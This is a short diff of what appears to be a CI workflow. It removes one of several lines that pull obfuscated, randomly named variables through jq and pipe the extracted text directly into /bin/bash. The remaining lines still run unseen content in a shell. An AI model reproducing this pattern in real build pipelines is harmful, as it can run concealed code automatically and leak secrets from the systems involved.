@@ -23,7 +23,6 @@ jobs:
           printf '%s' "$zmih23" | jq -r .agvb450 | /bin/bash
           echo $tboz6942 | jq -r .staf9949 | /bin/bash
           echo $awff56697 | jq -r .bkv77 | /bin/bash
-          printf '%s' "$jcjcz3075" | jq -r .iubr4 | /bin/bash
           echo $qkbkb8 | jq -r .ph341 | /bin/bash
 
       - name: Upload results
